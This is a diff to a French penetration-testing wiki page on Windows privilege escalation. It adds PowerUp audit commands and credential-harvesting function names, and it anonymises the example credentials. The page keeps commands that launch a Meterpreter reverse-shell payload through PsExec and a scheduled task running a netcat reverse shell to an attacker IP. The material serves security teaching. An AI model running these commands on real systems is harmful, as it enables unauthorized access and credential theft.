@@ -10,7 +10,12 @@ The following elements are based on <http://toshellandback.com/2015/11/24/ms-pri
 
 ## PowerSploit
 
-Le module [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) permet de faire la plupart des contrôles ci-dessous de manière complétement automatisée.
+Le module [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) de PowerSploit permet de faire la plupart des contrôles ci-dessous de manière complétement automatisée.
+
+```text
+Import-Module Privesc
+Invoke-AllChecks
+```
 
 ## Vulnérabilités systèmes
 
@@ -18,7 +23,18 @@ Il est possible de trouver des vulnérabilités non patchées sur le système. L
 
 ## Mot de passes
 
-De nombreux fichiers peuvent contenir des mots de passes sensibles. Voir [https://pentestlab.blog/2017/04/19/stored-credentials/](https://pentestlab.blog/2017/04/19/stored-credentials/).
+De nombreux fichiers peuvent contenir des mots de passes sensibles. La suite PowerUp dispose des fonctions suivantes pour trouver certains d'entre eux (tous sont appelés avec Inboke-AllChecks):
+
+```text
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+Get-RegistryAutoLogon
+```
+
+Voir [Stored Credentials (Pentestlab)](https://pentestlab.blog/2017/04/19/stored-credentials/).
 
 ## Trusted Service Paths
 
@@ -87,8 +103,9 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 On est parfois dans des situations où on a:
 
--   Un shell non interactif sur un serveur
+-   Un shell non interactif et non privilégié sur un serveur
 -   Le mot de passe administrateur du serveur
+-   Pas de possibilité de se connecter à distance avec ce mot de passe
 
 Dans ce cas il est possible d'executer des commandes avec une des méthodes suivantes.
 
@@ -97,7 +114,7 @@ Dans ce cas il est possible d'executer des commandes avec une des méthodes suiv
 Il faut avoir uploaddé [PsExec](/PsExec "wikilink"). Ensuite on peut exécuter la commande suivante:
 
 ``` bash
-PsExec \\BETHANY -u alice -p aliceisnice C:\HFS\encrypted_meterpreter_reverse_tcp_80.exe
+PsExec \\MACHINE -u user -p password C:\target\encrypted_meterpreter_reverse_tcp_80.exe
 ```
 
 ### schtasks
@@ -105,7 +122,7 @@ PsExec \\BETHANY -u alice -p aliceisnice C:\HFS\encrypted_meterpreter_reverse_tc
 Il est possible de créer une "scheduled task" et passer le mdp admin sur la ligne de commande.
 
 ``` bash
-schtasks /create /sc once /tr "nc.exe -e cmd.exe 192.168.30.156 443" /tn MASUPERTACHE /st 00:00:00 /ru alice /rp aliceisnice
+schtasks /create /sc once /tr "nc.exe -e cmd.exe 192.168.30.156 443" /tn MASUPERTACHE /st 00:00:00 /ru user /rp password
 schtasks /run /tn MASUPERTACHE
 ```
 
